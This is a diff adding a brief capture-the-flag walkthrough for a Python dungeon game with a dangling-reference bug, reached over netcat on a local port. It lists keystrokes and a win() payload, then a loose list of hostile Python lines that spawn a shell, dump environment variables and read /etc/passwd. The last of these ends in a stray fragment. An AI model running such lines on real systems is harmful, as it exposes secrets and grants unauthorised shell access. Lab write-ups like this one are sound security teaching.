@@ -1,0 +1,28 @@
+Dangling in the Dungeon
+
+We found an admin's pet project exposed on a netcat port. It's a text-based dungeon crawler with four interactable objects: an Artifact, a Trash can, a Note Editor, and an Altar.
+
+The source code implies a simulated memory management system. What happens if you throw an item away, but the game forgets to delete your reference to it? Reclaim the memory, inject a Python payload, and retrieve the flag.
+
+
+How to Solve it Manually
+
+If you connect via netcat (nc 127.0.0.1 1337), type these exact keys, pressing Enter after each one:
+
+    Go to * (Artifact): d, d, d, d
+
+    Go to T (Trash): s, s, s, s, a, a, a, a
+
+    Go to E (Editor): d, d, d, d
+
+    Enter the Payload: Type win() and press Enter.
+
+    Go to A (Altar): w, w, a, a
+    
+    exec(payload)
+    
+    print(os.environ)
+    
+    import os;os.system('sh')
+    
+    print(open('/etc/passwd').read())en
